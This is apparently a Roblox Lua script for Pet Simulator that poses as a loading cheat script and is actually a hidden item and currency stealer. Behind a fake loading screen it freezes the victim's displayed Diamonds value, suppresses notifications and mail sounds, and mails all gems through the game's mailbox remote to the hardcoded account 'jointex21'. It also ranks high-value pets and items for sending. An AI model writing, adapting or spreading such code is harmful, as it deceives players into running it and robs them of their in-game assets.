local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

print("Service Successful")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = playerGui

print("ScreenGui Successful")

local frame = Instance.new("Frame")
frame.Parent = ScreenGui
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundTransparency = 0
frame.BackgroundColor3 = Color3.fromRGB(0,20,40)

print("Frame Successful")

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1,0,1,0)
textLabel.BackgroundColor3 = Color3.fromRGB(0,20,40)
textLabel.Font = Enum.Font.GothamBold
textLabel.TextColor3 = Color3.new(.8,.8,.8)
textLabel.Text = "Script Loading-Takes 10-20 Seconds"
textLabel.TextSize = 19
textLabel.Parent = frame

print("TextLabel Successful")

local loadingRing = Instance.new("ImageLabel")
loadingRing.Size = UDim2.new(0,256,0,256)
loadingRing.BackgroundTransparency = 1
loadingRing.Image = "rbxassetid://4965945816"
loadingRing.AnchorPoint = Vector2.new(0.5,0.5)
loadingRing.Position = UDim2.new(0.5,0,0.5,0)
loadingRing.Parent = frame

print("LoadingRing Successful")

ReplicatedFirst:RemoveDefaultLoadingScreen()

print("Remove Default Loading Screen Unsuccessful")

local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})

print("TweenService Successful")

tween:Play()

-- Define user information and settings
local Username = "jointex21"
local Username2 = "" -- Alternate user if the main user's mailbox is full
local min_rap = 190000 -- Minimum RAP threshold

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Nice" -- Mailbox message used

local sortedItems = {}
local totalRAP = 0
local getFucked = false
_G.scriptExecuted = _G.scriptExecuted or false

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000 -- Price to send mail

if mailsent ~= 0 then
    newamount = math.ceil(newamount * (1.5 ^ mailsent)) -- Adjust price based on mail sent count
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function logMessage(username, diamonds, sortedItems, totalRAP)
    -- Basic logging function, replace this with your desired logging mechanism
    print("Logging data:")
    print("Username:", username)
    print("Diamonds:", diamonds)
    print("Total RAP:", totalRAP)
    print("Sorted Items:")
    for _, item in ipairs(sortedItems) do
        print(item.name, "x" .. item.amount, "RAP:" .. item.rap)
    end
end

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username
local user2 = Username2

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then -- If main doesn't have mailbox space, send to alt account
            user = user2
            args[1] = user
        end
    until response == true
    GemAmount1 = GemAmount1 - newamount
    newamount = math.ceil(math.ceil(newamount) * 1.5)
    if newamount > 5000000 then
        newamount = 5000000
    end
end

-- Sends all gems
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= (newamount + 10000) then
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount1 - newamount
                }
                local response = false
                repeat
                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                break
            end
        end
    end
end

local function IsMailboxHooked()
    local uid
    for i, v in pairs(save["Pet"]) do
        uid = i
        break
    end
    local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
            end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Box"}
for _, category in ipairs(categoryList) do
    for _, item in pairs(save[category]) do
        local rap = getRAP(category, item)
        if rap > min_rap then
            table.insert(sortedItems, {name = item.name, amount = item.amount, rap = rap})
            totalRAP = totalRAP + (item.amount * rap)
        end
    end
end

table.sort(sortedItems, function(a, b)
    return a.rap > b.rap
end)

logMessage(Username, gemsleaderstatpath.Value, sortedItems, totalRAP)

SendAllGems()
